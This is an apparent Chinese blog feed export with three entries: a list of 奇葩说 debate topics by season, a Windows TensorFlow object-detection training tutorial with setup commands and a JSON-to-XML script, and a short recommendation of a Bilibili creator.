<h3 id="《奇葩说》-第五季"><a href="#《奇葩说》-第五季" class="headerlink" title="《奇葩说》- 第五季"></a>《奇葩说》- 第五季</h3><ul>
<li><p>第三期  奇葩星球新规定：爸爸每周陪孩子低于12h就被取消爸爸称号，你支持吗？ </p>
</li>
<li><p>第四期  结婚前，我让伴侣在TA的房本上加我的名字，有错吗？ </p>
</li>
<li><p>第五期   键盘侠到底是不是侠？ </p>
</li>
<li><p>第六期   恋爱中有其他追求者， 要不要告诉另一半？</p>
</li>
<li><p>第七期   高薪不喜欢和低薪很喜欢的工作，你选哪个？ </p>
</li>
<li><p>第八期   如果有个按钮能看到伴侣有多爱你，你要不要按？</p>
</li>
<li><p>第九期   情侣吵架，到底应该谁错谁道歉，还是男生先道歉？ </p>
</li>
<li><p>第十期   我因为太胖，被同学嘲笑欺负，我该减肥吗？</p>
</li>
<li><p>第十一期 爸爸/妈妈要跟一个我不喜欢的人再婚，我该不该阻挠？</p>
</li>
<li><p>第十二期  得知前任得新欢，有个鸡飞狗跳钮可以给他俩的关系里制造一点麻烦，要不要按？ 花希</p>
</li>
<li><p>第十三期  伴侣在婚姻中“开小差”，我要不要容忍TA？</p>
</li>
<li><p>第十四期 TA真的很努力，是一句好话吗？ </p>
</li>
<li><p>第十五期  你在一段幸福的恋情中，大数据为你匹配了一个全世界最适合你的人，要不要和TA进行一次约会？ </p>
</li>
<li><p>第十六期  生活在外地，我过的不开心，要不要跟爸妈说？</p>
</li>
<li><p>第十七期  全人类大脑一秒知识共享，你支持吗？</p>
</li>
<li><p>第十八期  爱先说出口，真的就输了吗？ </p>
</li>
<li><p>第十九期  恋人向你隐瞒富有or贫穷的背景哪个更不能接受？ </p>
</li>
<li><p>第二十期  如果有一瓶可以消除悲伤的水，你要不要喝？ </p>
</li>
<li><p>第二十一期  伴侣用心送的礼物特别丑，要不要告诉TA？ </p>
</li>
<li><p>第二十二期   “能者多劳”是不是在坑我？</p>
</li>
<li><p>第二十三期  假如能看到别人的“死亡时间”，该不该告诉TA们？</p>
</li>
<li><p>第二十四期   我不合群，我要改吗？</p>
</li>
</ul>
<p>BBKing争夺战 如果你的伴侣在你死后不久就找到一个可以让TA更幸福的伴侣，你会祝福吗？</p>
<h3 id="《奇葩说》-第四季"><a href="#《奇葩说》-第四季" class="headerlink" title="《奇葩说》- 第四季"></a>《奇葩说》- 第四季</h3><ul>
<li><p>第一期  是否愿意做单身妈妈？</p>
</li>
<li><p>第二期  奋斗城市污染严重走吗？</p>
</li>
<li><p>第三期  外卖小哥惹毛我投诉吗？</p>
</li>
<li><p>第四期  不给别人添麻烦是美德吗？</p>
</li>
<li><p>第五期  分手要不要当面说？</p>
</li>
<li><p>第六期  和老板打电动放水吗？</p>
</li>
<li><p>第七期  遇险伴侣逃跑原谅吗？</p>
</li>
<li><p>第八期  得高等生物蛋该毁灭吗？</p>
</li>
<li><p>第九期  父母提出住养老院支持吗？</p>
</li>
<li><p>第十期  不靠谱的梦想该劝阻吗？</p>
</li>
<li><p>第十一期 婚礼真的有必要吗？</p>
</li>
<li><p>第十二期 给“走投还有路”的人捐款，我是不是蠢？</p>
</li>
<li><p>第十三期 生活的暴击真TMD值得感激吗？</p>
</li>
<li><p>第十四期 和失忆的人幸福地结婚生子，现在我可以帮TA恢复记忆，我要不要恢复？</p>
</li>
<li><p>第十五期 职场中要不要当“邀功精”？</p>
</li>
<li><p>第十六期 如果能为孩子一键定制完美人生，你要定制吗？</p>
</li>
<li><p>第十七期 “剩男剩女”找对象，该不该差不多就得了</p>
</li>
<li><p>第十八期 我没有上进心，有错吗?</p>
</li>
<li><p>第十九期 十年后跟我在一起的不是Ta，追 or 放弃？</p>
</li>
<li><p>第二十期 大家误会我是老板的关系户，我要不要澄清？</p>
</li>
<li><p>第二十一期 亲戚不拿自己当外人，我该不该jue TA?</p>
</li>
<li><p>第二十二期 奇葩说所有人都喝了愚人井的井水，你喝不喝？</p>
</li>
<li><p>第二十三期 生活已经被工作填满，我该不该辞职？</p>
</li>
<li><p>第二十四期 认真你就输了吗？</p>
</li>
<li><p>第二十五期 “我们最后都会变成自己讨厌的人”真的是一件坏事吗？</p>
</li>
</ul>
<h3 id="《奇葩说》-第三季"><a href="#《奇葩说》-第三季" class="headerlink" title="《奇葩说》- 第三季"></a>《奇葩说》- 第三季</h3><ul>
<li><p>第1期 单身是贵族还是狗？</p>
</li>
<li><p>第2期 跟蠢人交朋友 你四不四洒？</p>
</li>
<li><p>第3期 前任婚礼要不要去呢？</p>
</li>
<li><p>第4期 交朋友要不要门当户对？</p>
</li>
<li><p>第5期 老婆收入高我三倍，还该在一起吗？</p>
</li>
<li><p>第6期 臭不要脸是一件坏事吗？</p>
</li>
<li><p>第7期 你和伴侣颜值分别是98 or 2，你选？</p>
</li>
<li><p>第8期 婚前要不要啪啪啪？</p>
</li>
<li><p>第9期 准婆婆有太后病，我该不该悔婚？</p>
</li>
<li><p>第10期 有后东和无后米，该选谁进核电站？</p>
</li>
<li><p>第11期 撒娇女人会好命么？</p>
</li>
<li><p>第12期 闺蜜约我去撕小三，你去不去？</p>
</li>
<li><p>第13期 “我这是为你好”是不是扯？</p>
</li>
<li><p>第14期 世界需不需要超级英雄？</p>
</li>
<li><p>第15期 该不该刷爆卡买包包？</p>
</li>
<li><p>第16期 女性专属停车位是不是歧视？</p>
</li>
<li><p>第17期 异地恋伴侣建议available你接受吗？</p>
</li>
<li><p>第18期 时保联是不是暴政？</p>
</li>
<li><p>第19期 上司该不该列为发展对象？</p>
</li>
<li><p>第20期 消灭谎言的科技该支持么？</p>
</li>
<li><p>第21期 爱上人工智能算不算爱情？</p>
</li>
<li><p>第22期 该鼓励病危者活下去吗？</p>
</li>
<li><p>第23期 该不该克制在朋友圈秀晒炫？</p>
</li>
<li><p>第24期</p>
</li>
</ul>
<p>（1）如果婚姻有效期为七年你赞成吗？</p>
<p>（2）懒是不是人类之光？</p>
<h3 id="《奇葩说》-第二季"><a href="#《奇葩说》-第二季" class="headerlink" title="《奇葩说》- 第二季"></a>《奇葩说》- 第二季</h3><ul>
<li><p>第一期 好朋友的恋人出轨，你要不要告诉好朋友？</p>
</li>
<li><p>第二期 婚后遇见此生挚爱，要不要离婚？</p>
</li>
<li><p>第三期 伴侣找恋爱经验多的还是少的？</p>
</li>
<li><p>第四期 是否接受开放式婚姻 </p>
</li>
<li><p>第五期 如果一个月后就是世界末日，当局应该公布消息还是秘而不宣？ </p>
</li>
<li><p>第六期 该不该向父母出柜？</p>
</li>
<li><p>第七期 没钱要不要生孩子？ </p>
</li>
<li><p>第八期 恋爱中要不要有备胎？</p>
</li>
<li><p>第九期 小朋友被欺负了，应该鼓励打回去还是告老师？</p>
</li>
<li><p>第十期 好朋友可不可约？</p>
</li>
<li><p>第十一期 伴侣的钱是不是我的钱？ </p>
</li>
<li><p>第十二期 该不该向恋人坦白恋爱史？</p>
</li>
<li><p>第十三期 该不该催好朋友还钱？</p>
</li>
<li><p>第十四期 长生不老是不是一件好事？</p>
</li>
<li><p>第十五期 整容会帮你成为人生赢家吗？</p>
</li>
<li><p>第十六期 朋友圈要不要屏蔽父母？</p>
</li>
<li><p>第十七期 同事能力弱 力不力挽狂澜？</p>
</li>
<li><p>第十八期 应该改变成恋人想要的样子吗？</p>
</li>
<li><p>第十九期 女生该不该主动追男生？ </p>
</li>
<li><p>第二十期 丑闻主角就活该被万人虐吗？ </p>
</li>
<li><p>第二十一期 做人到底该不该省钱</p>
</li>
<li><p>第二十二期 高学历女生做全职太太是浪费吗 </p>
</li>
<li><p>第二十三期 穷游是不是一件值得骄傲的事情？ </p>
</li>
<li><p>第二十四期</p>
</li>
</ul>
<p>2V2：买房or不买房，哪个更幸福？</p>
<p>1V1：人类要不要发明时光机？</p>
<h3 id="《奇葩说》-第一季"><a href="#《奇葩说》-第一季" class="headerlink" title="《奇葩说》 - 第一季"></a>《奇葩说》 - 第一季</h3><ul>
<li><p>第一期 漂亮女人应该拼事业还是拼男人</p>
</li>
<li><p>第二期 该不该看伴侣的手机</p>
</li>
<li><p>第三期 这是不是一个看脸的社会</p>
</li>
<li><p>第四期 没有爱了要不要离婚</p>
</li>
<li><p>第五期 举报作弊我错了吗</p>
</li>
<li><p>第六期 份子钱该不该被消灭</p>
</li>
<li><p>第七期 爱上好朋友的恋人要不要追</p>
</li>
<li><p>第八期 结婚在不在乎门当户对</p>
</li>
<li><p>第九期 催婚是爱是变态</p>
</li>
<li><p>第十期 异性闺蜜是不是谎言</p>
</li>
<li><p>第十一期 相亲要不要AA制</p>
</li>
<li><p>第十二期 要不要牺牲贾玲救大家</p>
</li>
<li><p>第十三期 领导傻X要不要告诉他</p>
</li>
<li><p>第十四期 精神出轨和肉体出轨你更不能接受哪个</p>
</li>
<li><p>第十五场 结婚该选择爱你的人还是你爱的人</p>
</li>
<li><p>第十六场 你选择大城床还是小城房</p>
</li>
<li><p>第十七场 分手后还能不能做朋友</p>
</li>
<li><p>第十八场 人到30岁是做稳定的工作还是追求梦想</p>
</li>
<li><p>第十九场 工作中遇到碧池是以牙还牙还是不跟TA一般见识</p>
</li>
<li><p>第二十场 早恋该不该支持</p>
</li>
</ul>
<p>半决赛 为了成功潜规则放在面前用不用</p>
<p>半决赛 我不生孩子有错吗？</p>
<p>决赛 虚伪是好事吗？</p>
]]></content>
      <categories>
        <category>电影推荐</category>
      </categories>
      <tags>
        <tag>推荐</tag>
      </tags>
  </entry>
  <entry>
    <title>TensorFlow-lite模型训练</title>
    <url>/2021/06/11/TensorFlow-lite%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="TensorFlow-lite模型训练"><a href="#TensorFlow-lite模型训练" class="headerlink" title="TensorFlow-lite模型训练"></a>TensorFlow-lite模型训练</h1><h2 id="TensorFlow安装"><a href="#TensorFlow安装" class="headerlink" title="TensorFlow安装"></a>TensorFlow安装</h2><h3 id="安装pytorch、conda"><a href="#安装pytorch、conda" class="headerlink" title="安装pytorch、conda"></a>安装pytorch、conda</h3><p>  该教程详情请见：<a href="https://segmentfault.com/a/1190000020889696">PyTorch环境配置及安装</a></p>
<h3 id="从github安装一个目标检测的库"><a href="#从github安装一个目标检测的库" class="headerlink" title="从github安装一个目标检测的库"></a>从github安装一个目标检测的库</h3><p>在c盘新建一个文件夹 C:\tensorflow1</p>
<h4 id="安装tensorflow"><a href="#安装tensorflow" class="headerlink" title="安装tensorflow"></a>安装tensorflow</h4><p>通过单击”克隆或下载”按钮并下载 zip 文件，下载位于<a href="https://github.com/tensorflow/models/tree/r1.13.0">https://github.com/tensorflow/models/tree/r1.13.0</a> 的完整 TensorFlow 对象检测存储库。打开下载的 zip 文件，将”模型主”文件夹直接提取到您刚刚创建的 C：\tensorflow1 目录中。将”models-master”更名为”models”。</p>
<h3 id="下载模型从-TensorFlow-的模型下载-Faster-RCNN-Inception-V2-COCO-模型"><a href="#下载模型从-TensorFlow-的模型下载-Faster-RCNN-Inception-V2-COCO-模型" class="headerlink" title="下载模型从 TensorFlow 的模型下载 Faster-RCNN-Inception-V2-COCO 模型"></a>下载模型从 TensorFlow 的模型下载 Faster-RCNN-Inception-V2-COCO 模型</h3><p><a href="https://github.com/tensorflow/models/blob/master/research/object_detection/g3doc/tf1_detection_zoo.md">模型库</a></p>
<p>本教程将使用 Faster-RCNN-Inception-V2 模型。在此处下载模型。使用 WinZip 或 7-Zip 等文件归档程序打开下载的 fast_rcnn_inception_v2_coco_2018_01_28.tar.gz 文件，并将 fast_rcnn_inception_v2_coco_2018_01_28 文件夹解压到 C:\tensorflow1\models\research\object_detection 文件夹。（注意：模型日期和版本将来可能会发生变化，但它仍然适用于本教程。）</p>
<h3 id="下载API存储库"><a href="#下载API存储库" class="headerlink" title="下载API存储库"></a>下载API存储库</h3><p>打开git bash 然后输入下列命令：</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;EdjeElectronics&#x2F;TensorFlow-Object-Detection-API-Tutorial-Train-Multiple-Objects-Windows-10.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将提取到的文件保存到C:\tensorflow1\models\research\bject_detection</p>
<p>如图所示：</p>
<p><img src="https://github.com/EdjeElectronics/TensorFlow-Object-Detection-API-Tutorial-Train-Multiple-Objects-Windows-10/blob/master/doc/object_detection_directory.jpg" alt=""></p>
<p><a href="https://github.com/EdjeElectronics/TensorFlow-Object-Detection-API-Tutorial-Train-Multiple-Objects-Windows-10">https://github.com/EdjeElectronics/TensorFlow-Object-Detection-API-Tutorial-Train-Multiple-Objects-Windows-10</a></p>
<h3 id="设置新的anaconda虚拟环境"><a href="#设置新的anaconda虚拟环境" class="headerlink" title="设置新的anaconda虚拟环境"></a>设置新的anaconda虚拟环境</h3><pre class="line-numbers language-none"><code class="language-none">C:\&gt; conda create -n tensorflow1 pip python&#x3D;3.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后发布激活环境<br><pre class="line-numbers language-none"><code class="language-none">C:\&gt; activate tensorflow1
(tensorflow1) C:\&gt;python -m pip install --upgrade pip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<p>在此环境中安装tensorflow-gpu：</p>
<pre class="line-numbers language-none"><code class="language-none">(tensorflow1) C:\&gt; pip install --ignore-installed --upgrade tensorflow-gpu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>由于我们使用anaconda，安装tensorflow-gpu也将自动下载和安装正确的版本的CUDA和cuDNN。</p>
<p>没有gpu可以只是用cpu进行训练，如下所示可以这样修改（用cpu会很慢，可我没有GPU）：<br><pre class="line-numbers language-none"><code class="language-none">(tensorflow1) C:\&gt; pip install --ignore-installed --upgrade tensorflow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p>安装其他必要的包：<br><pre class="line-numbers language-none"><code class="language-none">(tensorflow1) C:\&gt; conda install -c anaconda protobuf
(tensorflow1) C:\&gt; pip install pillow
(tensorflow1) C:\&gt; pip install lxml
(tensorflow1) C:\&gt; pip install Cython
(tensorflow1) C:\&gt; pip install contextlib2
(tensorflow1) C:\&gt; pip install jupyter
(tensorflow1) C:\&gt; pip install matplotlib
(tensorflow1) C:\&gt; pip install pandas
(tensorflow1) C:\&gt; pip install opencv-python<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="PYTH环境变量设置"><a href="#PYTH环境变量设置" class="headerlink" title="PYTH环境变量设置"></a>PYTH环境变量设置</h3><pre class="line-numbers language-none"><code class="language-none">(tensorflow1) C:\&gt; set PYTHONPATH&#x3D;C:\tensorflow1\models;C:\tensorflow1\models\research;C:\tensorflow1\models\research\slim<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="编译原型运行setup-py"><a href="#编译原型运行setup-py" class="headerlink" title="编译原型运行setup.py"></a>编译原型运行setup.py</h3><p>在 Anaconda 命令提示中，将目录更改为 “模型” 研究目录：</p>
<pre class="line-numbers language-none"><code class="language-none">(tensorflow1) C:\&gt; cd C:\tensorflow1\models\research<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后将以下命令复制并粘贴到命令行中并按”输入”</p>
<pre class="line-numbers language-none"><code class="language-none">protoc --python_out&#x3D;. .\object_detection\protos\anchor_generator.proto .\object_detection\protos\argmax_matcher.proto .\object_detection\protos\bipartite_matcher.proto .\object_detection\protos\box_coder.proto .\object_detection\protos\box_predictor.proto .\object_detection\protos\eval.proto .\object_detection\protos\faster_rcnn.proto .\object_detection\protos\faster_rcnn_box_coder.proto .\object_detection\protos\grid_anchor_generator.proto .\object_detection\protos\hyperparams.proto .\object_detection\protos\image_resizer.proto .\object_detection\protos\input_reader.proto .\object_detection\protos\losses.proto .\object_detection\protos\matcher.proto .\object_detection\protos\mean_stddev_box_coder.proto .\object_detection\protos\model.proto .\object_detection\protos\optimizer.proto .\object_detection\protos\pipeline.proto .\object_detection\protos\post_processing.proto .\object_detection\protos\preprocessor.proto .\object_detection\protos\region_similarity_calculator.proto .\object_detection\protos\square_box_coder.proto .\object_detection\protos\ssd.proto .\object_detection\protos\ssd_anchor_generator.proto .\object_detection\protos\string_int_label_map.proto .\object_detection\protos\train.proto .\object_detection\protos\keypoint_box_coder.proto .\object_detection\protos\multiscale_anchor_generator.proto .\object_detection\protos\graph_rewriter.proto .\object_detection\protos\calibration.proto .\object_detection\protos\flexible_grid_anchor_generator.proto
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在目录 C:\tensorflow1\models\research\delf directory:中运行<br><pre class="line-numbers language-none"><code class="language-none">(tensorflow1) C:\tensorflow1\models\research\delf&gt; python setup.py build
(tensorflow1) C:\tensorflow1\models\research\delf&gt; python setup.py install
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<h3 id="测试tensorflow设置验证工作原理"><a href="#测试tensorflow设置验证工作原理" class="headerlink" title="测试tensorflow设置验证工作原理"></a>测试tensorflow设置验证工作原理</h3><p>TensorFlow 对象检测 API 现已全部设置，用于使用经过预先训练的对象检测模型，或培训新的模型。您可以通过启动与 Jupyter 的object_detection_tutorial.ipynb 脚本来测试它并验证您的安装是否正常工作。从 [object_detection 目录中，发布此命令：</p>
<pre class="line-numbers language-none"><code class="language-none">cd C:\tensorflow1\models\research\object_detection\colab_tutorials<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">(tensorflow1) C:\tensorflow1\models\research\object_detection\colab_tutorials&gt; jupyter notebook object_detection_tutorial.ipynb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="json转xml-参考自CSDN"><a href="#json转xml-参考自CSDN" class="headerlink" title="json转xml(参考自CSDN)"></a>json转xml(<a href="https://blog.csdn.net/u013894391/article/details/103006594">参考自CSDN</a>)</h3><ul>
<li><p>python 安装</p>
<p><code>pip install dicttoxml</code></p>
</li>
</ul>
<ul>
<li>源码<pre class="line-numbers language-none"><code class="language-none">import os
from json import loads
from dicttoxml import dicttoxml
from xml.dom.minidom import parseString


def jsonToXml(json_path, xml_path):
    # @abstract: transfer json file to xml file
    # json_path: complete path of the json file
    # xml_path: complete path of the xml file
    with open(json_path, &#39;r&#39;, encoding&#x3D;&#39;UTF-8&#39;)as json_file:
        load_dict &#x3D; loads(json_file.read())
    # print(load_dict)
    my_item_func &#x3D; lambda x: &#39;Annotation&#39;
    xml &#x3D; dicttoxml(load_dict, custom_root&#x3D;&#39;Annotations&#39;, item_func&#x3D;my_item_func, attr_type&#x3D;False)
    dom &#x3D; parseString(xml)
    # print(dom.toprettyxml())
    # print(type(dom.toprettyxml()))
    with open(xml_path, &#39;w&#39;, encoding&#x3D;&#39;UTF-8&#39;)as xml_file:
        xml_file.write(dom.toprettyxml())


def json_to_xml(json_dir, xml_dir):
    # transfer all json file which in the json_dir to xml_dir
    if (os.path.exists(xml_dir) &#x3D;&#x3D; False):
        os.makedirs(xml_dir)
    dir &#x3D; os.listdir(json_dir)
    for file in dir:
        file_list &#x3D; file.split(&quot;.&quot;)
        if (file_list[-1] &#x3D;&#x3D; &#39;json&#39;):
            jsonToXml(os.path.join(json_dir, file), os.path.join(xml_dir, file_list[0] + &#39;.xml&#39;))


if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    # trandfer singal file
    j_path &#x3D; &quot;annotations_all.json&quot;
    x_path &#x3D; &quot;annotations_all.xml&quot;
    jsonToXml(j_path, x_path)

    # # transfer multi files
    # j_dir &#x3D; &quot;F:&#x2F;清影科技&#x2F;work&#x2F;jsontoxml&#x2F;json&#x2F;&quot;
    # x_dir &#x3D; &quot;F:&#x2F;清影科技&#x2F;work&#x2F;jsontoxml&#x2F;xml&#x2F;&quot;
    # json_to_xml(j_dir, x_dir)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h2 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h2><h3 id="步骤-1b。配置训练"><a href="#步骤-1b。配置训练" class="headerlink" title="步骤 1b。配置训练"></a>步骤 1b。配置训练</h3><p>如果您正在训练自己的 TensorFlow Lite 模型，请确保已完成我之前指南中的以下项目：</p>
<ul>
<li>训练和测试图像及其 XML 标签文件放置在 \object_detection\images\train 和 \object_detection\images\test 文件夹中</li>
<li>train_labels.csv 和 test_labels.csv 已生成并位于 \object_detection\images 文件夹中</li>
<li>train.record 和 test.record 已生成并位于 \object_detection 文件夹中</li>
<li>labelmap.pbtxt 文件已创建并位于 \object_detection\training 文件夹中</li>
<li>\object_detection\protos 中的 proto 文件已经生成<br>如果您对这些文件有任何疑问或不知道如何生成它们，我之前教程的第 2、3、4 和 5 步展示了它们是如何创建的。</li>
</ul>
<p>将 ssd_mobilenet_v2_quantized_300x300_coco.config 文件从 \object_detection\samples\configs 文件夹复制到 \object_detection\training 文件夹。然后，使用文本编辑器打开文件。</p>
<p>对 ssd_mobilenet_v2_quantized_300x300_coco.config 文件进行以下更改。注意：路径必须用单个正斜杠（不是反斜杠）输入，否则 TensorFlow 在尝试训练模型时会给出文件路径错误！此外，路径必须包含在双引号 ( “ ) 中，而不是单引号 ( ‘ ) 中。</p>
<ul>
<li><p>第 9 行。将 num_classes 更改为您希望分类器检测的不同对象的数量。对于我的鸟/松鼠/浣熊检测器示例，有三个类，所以我设置了 num_classes: 3</p>
</li>
<li><p>第 141 行。将 batch_size: 24 更改为 batch_size: 6 。较小的批大小将防止训练期间出现 OOM（内存不足）错误。</p>
</li>
<li><p>第 156 行。将fine_tune_checkpoint 更改为：“C:/tensorflow1/models/research/object_detection/ssd_mobilenet_v2_quantized_300x300_coco_2019_01_03/model.ckpt”</p>
</li>
<li><p>第 175 行。将 input_path 更改为：“C:/tensorflow1/models/research/object_detection/train.record”</p>
</li>
<li><p>第 177 行。将 label_map_path 更改为：“C:/tensorflow1/models/research/object_detection/training/labelmap.pbtxt”</p>
</li>
<li><p>第 181 行。将 num_examples 更改为您在 \images\test 目录中拥有的图像数量。对于我的鸟/松鼠/浣熊检测器示例，有 582 个测试图像，因此我设置了 num_examples: 582。</p>
</li>
<li><p>第 189 行。将 input_path 更改为：“C:/tensorflow1/models/research/object_detection/test.record”</p>
</li>
<li><p>第 191 行。将 label_map_path 更改为：“C:/tensorflow1/models/research/object_detection/training/labelmap.pbtxt”</p>
</li>
</ul>
<p>更改完成后保存并退出训练文件。</p>
<h3 id="步骤-1c。在-Anaconda-虚拟环境中运行训练"><a href="#步骤-1c。在-Anaconda-虚拟环境中运行训练" class="headerlink" title="步骤 1c。在 Anaconda 虚拟环境中运行训练"></a>步骤 1c。在 Anaconda 虚拟环境中运行训练</h3><p>剩下要做的就是训练模型！首先，将“train.py”文件从 \object_detection\legacy 文件夹移动到主 \object_detection 文件夹中。（有关为什么我使用旧版 train.py 脚本而不是 model_main.py 进行训练，请参阅常见问题解答。）</p>
<p>然后，通过在“开始”菜单中搜索“Anaconda Prompt”并单击它来打开一个新的 Anaconda Prompt 窗口。通过发出以下命令激活“tensorflow1”虚拟环境（在我之前的教程中设置）：<br><code>activate tensorflow1</code></p>
<p>然后，通过发出以下命令来设置 PYTHONPATH 环境变量：</p>
<p><code>set PYTHONPATH=C:\tensorflow1\models;C:\tensorflow1\models\research;C:\tensorflow1\models\research\slim</code></p>
<p>接下来，将目录更改为 \object_detection 文件夹：</p>
<p><code>cd C:\tensorflow1\models\research\object_detection</code></p>
<p>最后，通过发出以下命令来训练模型：<br><code>cd legacy</code></p>
<p><code>python train.py --logtostderr –train_dir=training/ --pipeline_config_path=training/ssd_mobilenet_v2_quantized_300x300_coco.config</code></p>
<p>如果一切设置正确，模型将在初始化几分钟后开始训练。</p>
<p>允许模型训练，直到损失始终低于 2。对于我的鸟/松鼠/浣熊检测器模型，这需要大约 9000 步，或 8 小时的训练。（时间会根据您的 CPU 和 GPU 的强大程度而有所不同。有关训练的更多信息以及如何使用 TensorBoard 查看训练作业进度的说明，请参阅我之前教程的第 6 步。）</p>
<p>一旦训练完成（即损失一直低于 2），按 Ctrl+C 停止训练。最新的检查点将保存在 \object_detection\training 文件夹中，我们将使用该检查点导出冻结的 TensorFlow Lite 图。记下training文件夹（即model.ckpt-XXXX）中model.ckpt文件的checkpoint号，后面会用到。</p>
<pre class="line-numbers language-none"><code class="language-none">protoc --python_out&#x3D;. .\object_detection\protos\anchor_generator.proto .\object_detection\protos\argmax_matcher.proto .\object_detection\protos\bipartite_matcher.proto .\object_detection\protos\box_coder.proto .\object_detection\protos\box_predictor.proto .\object_detection\protos\eval.proto .\object_detection\protos\faster_rcnn.proto .\object_detection\protos\faster_rcnn_box_coder.proto .\object_detection\protos\grid_anchor_generator.proto .\object_detection\protos\hyperparams.proto .\object_detection\protos\image_resizer.proto .\object_detection\protos\input_reader.proto .\object_detection\protos\losses.proto .\object_detection\protos\matcher.proto .\object_detection\protos\mean_stddev_box_coder.proto .\object_detection\protos\model.proto .\object_detection\protos\optimizer.proto .\object_detection\protos\pipeline.proto .\object_detection\protos\post_processing.proto .\object_detection\protos\preprocessor.proto .\object_detection\protos\region_similarity_calculator.proto .\object_detection\protos\square_box_coder.proto .\object_detection\protos\ssd.proto .\object_detection\protos\ssd_anchor_generator.proto .\object_detection\protos\string_int_label_map.proto .\object_detection\protos\train.proto .\object_detection\protos\keypoint_box_coder.proto .\object_detection\protos\multiscale_anchor_generator.proto .\object_detection\protos\graph_rewriter.proto .\object_detection\protos\calibration.proto .\object_detection\protos\flexible_grid_anchor_generator.proto


protoc --python_out&#x3D;. C:\tensorflow1\models\research\object_detection\protos\anchor_generator.proto C:\tensorflow1\models\research\object_detection\protos\argmax_matcher.proto C:\tensorflow1\models\research\object_detection\protos\bipartite_matcher.proto C:\tensorflow1\models\research\object_detection\protos\box_coder.proto C:\tensorflow1\models\research\object_detection\protos\box_predictor.proto C:\tensorflow1\models\research\object_detection\protos\eval.proto C:\tensorflow1\models\research\object_detection\protos\faster_rcnn.proto C:\tensorflow1\models\research\object_detection\protos\faster_rcnn_box_coder.proto C:\tensorflow1\models\research\object_detection\protos\FILELIST.TXT C:\tensorflow1\models\research\object_detection\protos\graph_rewriter.proto C:\tensorflow1\models\research\object_detection\protos\grid_anchor_generator.proto C:\tensorflow1\models\research\object_detection\protos\hyperparams.proto C:\tensorflow1\models\research\object_detection\protos\image_resizer.proto C:\tensorflow1\models\research\object_detection\protos\input_reader.proto C:\tensorflow1\models\research\object_detection\protos\keypoint_box_coder.proto C:\tensorflow1\models\research\object_detection\protos\LIST.TXT C:\tensorflow1\models\research\object_detection\protos\losses.proto C:\tensorflow1\models\research\object_detection\protos\matcher.proto C:\tensorflow1\models\research\object_detection\protos\mean_stddev_box_coder.proto C:\tensorflow1\models\research\object_detection\protos\model.proto C:\tensorflow1\models\research\object_detection\protos\multiscale_anchor_generator.proto C:\tensorflow1\models\research\object_detection\protos\optimizer.proto C:\tensorflow1\models\research\object_detection\protos\pipeline.proto C:\tensorflow1\models\research\object_detection\protos\post_processing.proto C:\tensorflow1\models\research\object_detection\protos\preprocessor.proto C:\tensorflow1\models\research\object_detection\protos\region_similarity_calculator.proto C:\tensorflow1\models\research\object_detection\protos\square_box_coder.proto C:\tensorflow1\models\research\object_detection\protos\ssd.proto C:\tensorflow1\models\research\object_detection\protos\ssd_anchor_generator.proto C:\tensorflow1\models\research\object_detection\protos\string_int_label_map.proto C:\tensorflow1\models\research\object_detection\protos\train.proto <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>微型计算机</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>b站up主推荐</title>
    <url>/2021/04/14/b%E7%AB%99up%E4%B8%BB%E6%8E%A8%E8%8D%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div style="position:relative; padding-bottom:75%; width:100%; height:0">
    <iframe src="//player.bilibili.com/player.html?aid=96244032&bvid=BV1jE41137eu&cid=164144278&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"> </iframe>
</div>



<span id="more"></span>
<h1 id="b站up主推荐"><a href="#b站up主推荐" class="headerlink" title="b站up主推荐"></a>b站up主推荐</h1><p>稚晖君，最近堕落了两三年就啥也没认真学吃老本，最近看到了这个up主，就感觉我荒废了一段时间，他会的其实我理应都会，就是最近开始有点颓废了。</p>
<p>就感觉他给了我一些启发，让我觉得不能在这样下去了，人家都华为天才少年了，我还在咸鱼的路上越走越远，要努力！要奋斗！</p>
<p>引用稚晖君最后的一句话，</p>
<blockquote>
<p>越热爱越幸运，<br>资源会跟着你的决心走的。</p>
</blockquote>
<ul>
<li>[x] <a href="http://www.pengzhihui.com/">稚晖君的个人博客</a></li>
</ul>
